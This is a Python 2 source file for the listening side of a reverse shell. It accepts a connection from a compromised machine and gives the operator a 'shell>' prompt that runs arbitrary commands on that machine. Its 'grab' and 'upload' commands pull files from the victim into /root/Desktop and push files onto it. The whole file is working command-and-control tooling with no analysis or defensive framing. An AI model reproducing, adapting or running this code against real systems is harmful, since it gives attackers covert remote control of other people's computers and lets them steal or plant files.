import socket
import os


def transfergrab(conn,command):
    conn.send(command)
    grab,filename=command.split('*')
    path="//root//Desktop//"
    path += filename
    
    bits=conn.recv(1024)
    if "The File Doesn't Exist" in bits:
            print("[-]The File Doesn't Exist")
    else:
        f=open(path,'wb+')
        while True:
            f.write(bits)
                
            if bits.endswith('DONE'):
                print("[+]File Transfer Complete")
                f.close()
                break
            bits=conn.recv(1024)
            
          
def transferupload(conn,command):
    print("[+] YOU HAVE INVOKED THE UPLOAD COMMAND")
    print("[+] THE FILE MUST BE IN YOUR CURRENT WORKING DIRECTORY")
    upload,fname=command.split('*')
    if os.path.exists(fname):
        
        conn.send(command)
        
        print("[+]UPLOADING")
        f=open(fname,'rb')
        f.seek(0)
        packet=f.read(1024)
        while packet!='':
            conn.send(packet)
            packet=f.read(1024)
        conn.send("DONE")
        f.close()
        print("[+]UPLOAD SUCCESSFULL")
    else:
        print("[-]The File Doesn't Exist")
        




def connect():
    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.bind(("127.0.0.1",8080))
    s.listen(1)

    print("[+] Listening for incoming TCP connection")
    conn,addr=s.accept()
    print ("[+] We got connection from:",addr)
    	

    while True:
        command=raw_input("shell>")
        if 'exit' in command:
            conn.send('exit')
            conn.close()
            print("ok bye")
            break
        
        elif 'grab' in command:
            transfergrab(conn,command)

        elif 'upload' in command:
            transferupload(conn,command)
            
            
        else:
            conn.send(command)
            shell=conn.recv(1024)
            while True:
                print shell
                if shell.endswith("DONE"):
                    break
                shell=conn.recv(1024)

connect()

    
